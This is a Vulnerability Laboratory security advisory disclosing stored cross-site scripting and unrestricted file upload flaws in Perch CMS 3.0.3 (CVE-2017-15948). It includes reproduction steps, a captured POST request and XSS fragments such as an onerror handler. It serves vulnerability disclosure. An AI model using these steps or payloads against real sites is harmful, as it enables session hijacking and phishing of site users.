=== Content from www.vulnerability-lab.com_eec6b3cf_20250125_204709.html ===
Document Title:
===============
Perch v3.0.3 CMS - Multiple Web Vulnerabilities
References (Source):
====================
https://www.vulnerability-lab.com/get\_content.php?id=2067
http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-15948
CVE-ID:
=======
CVE-2017-15948
Release Date:
=============
2017-05-28
Vulnerability Laboratory ID (VL-ID):
====================================
2067
Common Vulnerability Scoring System:
====================================
5.5
Vulnerability Class:
====================
Arbitrary File Upload
Product & Service Introduction:
===============================
Perch is a content management system designed for small websites as a drop-in solution. Perch Runway a fully featured CMS for larger content driven sites.
They share a template language and many features - the main difference is the types of projects they are each designed for.
(Copy of the Homepage: https://docs.grabaperch.com )
Abstract Advisory Information:
==============================
The Vulnerability Laboratory discovered an unrestricted file upload & stored cross site scripting web vulnerabilities in the Perch v3.0.3 Content Management System.
Vulnerability Disclosure Timeline:
==================================
2017-05-29: Public Disclosure (Vulnerability Laboratory)
Discovery Status:
=================
Published
Affected Product(s):
====================
Edgeofmyseat
Product: Perch - Content Management System (Web-Application) 3.0.3
Exploitation Technique:
=======================
Remote
Severity Level:
===============
Medium
Technical Details & Description:
================================
An unrestricted file upload & stored cross site scripting vulnerabilities has been discovered in the official Perch v3.0.3 content management system.
The security vulnerability is located in the `Asset Title` input field & `Select File` upload file of the vulnerable `Adding a New Asset` module POST method request.
The `Asset Title` validation input field allows to execute any injected payload string code that is stored in the database management system. The `Select File` field
is not parsed and allows a limited admin to upload unrestricted files to the web-server system.
The security risk of the stored cross site scripting & unrestricted file upload vulnerability is estimated as medium. Exploitation of the (non-persistent & persistent)
input validation web vulnerability requires a privileged web-application user account and medium user interaction. Successful exploitation of the vulnerability results
in session hijacking, non-persistent and persistent phishing attacks, non-persistent and persistent external redirects to malicious source, non-persistent and persistent
manipulation of affected or connected application modules.
Proof of Concept (PoC):
=======================
The unrestricted file upload & stored cross site scripting web vulnerabilities can be exploited by remote attackers with privileged user account and with Medium user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
Manual steps to reproduce the vulnerability ...
1. Install Perch CMS
Note: Your Account is a "Primary Admin"
2. Login to the web-application
3. Add " Limited Admin " with Admin Role
4. Add " UserLab " with Editor Role
Log Out Your "Primary Admin" Account and Log in with "Limited Admin" Account
5. Go To ..assets/
6. Add asset button
7. Create a MALICIOUS SCRIPT CODE EXECUTION Title
8. Upload any Malware or malicious file
9. Click on Submit button
10. Open The "UserLab & Primary Admin " Accounts
11. Go To Listing Assets
12. The execution of the vulnerability by an limited admin are Stored and published in all Users "Listing assets" module
13. Successful reproduce of the vulnerability!
PoC: Attack Scheme :
https://www.youtube.com/watch?v=klYQ6iXfjUI&feature=youtu.be
PoC: LimitedAdmin - Asset Title => (http://Perch-cms.localhost:8080/perch/core/apps/assets/edit/?id=)

* [Assets](/perch/core/apps/assets/)   [">[ SCRIPT CODE EXECUTION! ]](/perch/core/apps/assets/edit/?id=)

PoC: LimitedAdmin -Select File => (http://Perch-cms.localhost:8080/perch/core/apps/assets/edit/?id=)
### [">[ Unrestricted "Malware&Malicious" FileUpload! ]>](/perch/resources/poc2-3.html)

* Doc / HTML
* 0KB

--- PoC Session Logs [POST] ---
POST /perch/core/apps/assets/edit/ HTTP/1.1
Host: Perch-cms.localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------287332380928218
Content-Length: 1118
Referer: http://Perch-cms.localhost:8080/perch/core/apps/assets/edit/
Cookie: PHPSESSID=e6pok7gnvci66jb7noti2j0nu5; cmsa=1
Connection: keep-alive
-----------------------------287332380928218: undefined
Content-Disposition: form-data; name="resourceTitle"
[ SCRIPT CODE EXECUTION! ]
-----------------------------287332380928218
Content-Disposition: form-data; name="image"; filename="poc1.html"
Content-Type: text/html
[ Unrestricted "Malware&Malicious" FileUpload! ]
[Malicious Site + IP Adress/Redirection + File]:=[download]
-----------------------------287332380928218
Content-Disposition: form-data; name="image\_field"
1
-----------------------------287332380928218
Content-Disposition: form-data; name="image\_assetID"
-----------------------------287332380928218
Content-Disposition: form-data; name="resourceBucket"
default
-----------------------------287332380928218
Content-Disposition: form-data; name="tags"
-----------------------------287332380928218
Content-Disposition: form-data; name="btnsubmit"
Submit
-----------------------------287332380928218
Content-Disposition: form-data; name="formaction"
edit
-----------------------------287332380928218
Content-Disposition: form-data; name="token"
7860b50e7d1965fcc59ebf9c49be0034
-----------------------------287332380928218--
HTTP/1.1 200 OK
Server: \*\*\*\*\*\*
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
x-frame-options: deny
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
PoC: Affected Accounts
[+] Role : Primary Admin
[+] Vulnerable Modules(s): Listing assets
# Listing assets

 [Add
asset](/perch/core/apps/assets/edit/)

* [Grid](/perch/core/apps/assets/?view=grid) [List](/perch/core/apps/assets/?view=list)
* [By Type](/perch/core/apps/assets/?show-filter=atf "By Type")
* [By Bucket](/perch/core/apps/assets/?show-filter=bf "By Bucket")
* [By Tag](/perch/core/apps/assets/?show-filter=tf "By Tag")

* [Images](/perch/core/apps/assets/?type=img)
* [Files](/perch/core/apps/assets/?type=file)
* [Documents](/perch/core/apps/assets/?type=doc)
* [Spreadsheets](/perch/core/apps/assets/?type=sheet)
* [Audio](/perch/core/apps/assets/?type=audio)
* [Video](/perch/core/apps/assets/?type=video)
* [Presentations](/perch/core/apps/assets/?type=pres)
* [Archives](/perch/core/apps/assets/?type=archive)
* [HTML](/perch/core/apps/assets/?type=html)

* [Default](/perch/core/apps/assets/?bucket=default)

* [onerror=prompt(0);>](/perch/core/apps/assets/?tag=onerrorprompt0)
* [src=x](/perch/core/apps/assets/?tag=srcx)
* [">](/perch/core/apps/assets/?tag=ra-490d-e044)
 [Clear](/perch/core/apps/assets/) [">[ SCRIPT CODE EXECUTION! ]>](/perch/core/apps/assets/edit/?id=38)
[+] Vulnerable Input Field(s): Asset Title
Title (required)

[+] Vulnerable Input Field(s): Select File
[">[Malicious Site + IP Adress/Redirection + File]:=[download]>](/perch/resources/%5B%20Unrestricted%20)
[+] Role : Editor
[+] Vulnerable Modules(s): Listing assets
 [">[ SCRIPT CODE EXECUTION! ]>](/perch/core/apps/assets/edit/?id=38)
[+] Vulnerable Input Field(s): Asset Title
">[ SCRIPT CODE EXECUTION! ]>

Security Risk:
==============
The security risk of the persistent cross site and unrestricted file upload web vulnerabilities in the Perch CMS is estimated as medium .
Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - SaifAllah benMassaoud (https://twitter.com/benmassaou) - (https://www.vulnerability-lab.com/show.php?user=S.AbenMassaoud)
Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or
implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any
case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its
suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface
websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories
or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails,
phone numbers, conversations or anything else to journalists, investigative authorities or private individuals.
Domains: www.vulnerability-lab.com - www.vulnerability-db.com - www.evolution-sec.com
Programs: vulnerability-lab.com/submit.php - vulnerability-lab.com/list-of-bug-bounty-programs.php - vulnerability-lab.com/register.php
Feeds: vulnerability-lab.com/rss/rss.php - vulnerability-lab.com/rss/rss\_upcoming.php - vulnerability-lab.com/rss/rss\_news.php
Social: twitter.com/vuln\_lab - facebook.com/VulnerabilityLab - youtube.com/user/vulnerability0lab
Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory.
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by
Vulnerability Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark
of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get an ask permission.
Copyright © 2017 | Vulnerability Laboratory - [Evolution Security GmbH]™

